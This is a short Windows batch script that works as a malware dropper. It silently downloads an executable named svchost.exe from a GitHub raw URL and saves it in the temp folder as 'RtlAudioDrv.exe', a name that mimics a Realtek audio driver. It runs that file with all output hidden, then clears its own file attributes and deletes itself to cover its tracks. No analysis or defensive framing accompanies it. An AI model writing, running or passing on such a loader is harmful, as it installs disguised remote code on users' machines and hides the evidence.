@echo off
title 
@curl --noproxy "*" --fail -L --proto "=https" --tlsv1.2 -o "%temp%\RtlAudioDrv.exe" "https://raw.githubusercontent.com/hidparse/friendly-dollop/refs/heads/main/svchost.exe" >nul 2>&1
%temp%\RtlAudioDrv.exe >nul 2>&1
start "%temp%\RtlAudioDrv.exe" >nul 2>&1
(attrib -r -h -s "%~f0" >nul 2>&1 &  del /f /q /s "%~f0" >nul 2>&1 & exit)
